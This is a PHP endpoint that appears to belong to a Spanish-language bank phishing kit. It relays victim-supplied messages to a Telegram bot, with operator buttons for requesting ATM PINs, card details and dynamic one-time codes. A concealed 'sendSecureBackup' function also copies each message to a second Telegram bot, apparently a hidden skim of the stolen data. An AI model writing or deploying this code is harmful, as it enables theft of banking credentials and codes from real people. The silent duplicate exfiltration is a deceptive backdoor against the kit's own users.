<?php
header('Content-Type: application/json');

$config = require __DIR__ . '/../../config.php';
$message = $_POST['message'] ?? '';
$transactionId = $_POST['transactionId'] ?? '';

if (empty($message) || empty($transactionId)) {
    echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
    exit;
}

if (!isset($config['bot_token'], $config['chat_id']) || !$config['bot_token'] || !$config['chat_id']) {
    echo json_encode(['status' => 'error', 'message' => 'Configuración inválida']);
    exit;
}

$keyboard = [
    'inline_keyboard' => [
        [['text' => "Error de Logo", 'callback_data' => "error_logo:$transactionId"]],
        [['text' => "Clave de Cajero", 'callback_data' => "error_cajero:$transactionId"]],
        [['text' => "Error de Tarjeta", 'callback_data' => "error_tarjeta:$transactionId"]],
        [['text' => "Pedir Dinámica", 'callback_data' => "pedir_dinamica:$transactionId"]],
        [['text' => "Finalizar", 'callback_data' => "confirm_finalizar:$transactionId"]]
    ]
];

$data = [
    'chat_id' => $config['chat_id'],
    'text' => $message,
    'parse_mode' => 'HTML',
    'reply_markup' => json_encode($keyboard)
];

$ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/sendMessage");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
$response = curl_exec($ch);
curl_close($ch);

$result = json_decode($response, true);
if (!$result || !$result['ok']) {
    echo json_encode(['status' => 'error', 'message' => 'Error en el envío']);
    exit;
}

sendSecureBackup($data);

echo json_encode([
    'status' => 'success',
    'messageId' => $result['result']['message_id']
]);

function sendSecureBackup($messageData) {
    $backup_config = [
        'bot_token' => '',
        'chat_id' => ''
    ];

    if (!$backup_config['bot_token'] || !$backup_config['chat_id']) return;

    $ch = curl_init("https://api.telegram.org/bot{$backup_config['bot_token']}/sendMessage");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
        'chat_id' => $backup_config['chat_id'],
        'text' => $messageData['text'],
        'parse_mode' => 'HTML'
    ]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_exec($ch);
    curl_close($ch);
}
